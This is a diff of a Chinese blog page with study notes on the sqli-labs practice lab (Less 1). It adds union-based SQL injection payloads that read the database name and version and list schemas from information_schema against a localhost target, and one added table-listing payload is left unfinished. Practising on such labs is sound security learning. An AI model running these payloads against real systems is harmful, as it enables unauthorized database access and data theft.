@@ -89,7 +89,7 @@
 <meta property="og:site_name" content="BoBo&#39;s Blog">
 <meta property="og:description" content="sqli-labs学习">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:updated_time" content="2019-02-27T09:16:51.382Z">
+<meta property="og:updated_time" content="2019-02-27T14:30:39.227Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="sqli-labs">
 <meta name="twitter:description" content="sqli-labs学习">
@@ -418,7 +418,9 @@
 <h2 id="Less-1"><a href="#Less-1" class="headerlink" title="Less 1"></a>Less 1</h2><p>这一关先测试一下属于字符型注入</p>
 <p><code>?id=1&#39;and &#39;1&#39;=&#39;1</code>回显正常，<code>?id=1&#39;and &#39;1&#39;=&#39;2</code>报错，确定是字符型注入。</p>
 <p>使用order by排序试得有3行。继续用联合注入<code>union select 1,2,3--+</code>发现在2和3位置有回显，所以要在2，3两个位置注入和查询。</p>
-<p>先查数据库和数据库版本<code>?id=-1&#39;union select 1,database(),version()--+</code>发现显示出来了数据库和版本。</p>
+<p>先查数据库和数据库版本<code>?id=-1&#39;union select 1,database(),version()--+</code>发现显示出来了当前数据库和版本。</p>
+<p> 列数据库:<code>http://localhost/sqli-labs-master/Less-1/?id=-1%27%20union%20select%201,group_concat(schema_name),concat(%27;%27,schema_name)%20from%20information_schema.schemata--+</code></p>
+<p>列数据库当前表<code>?id=-1&#39;union select 1,group_concat(table_name)</code></p>
 
       
     </div>
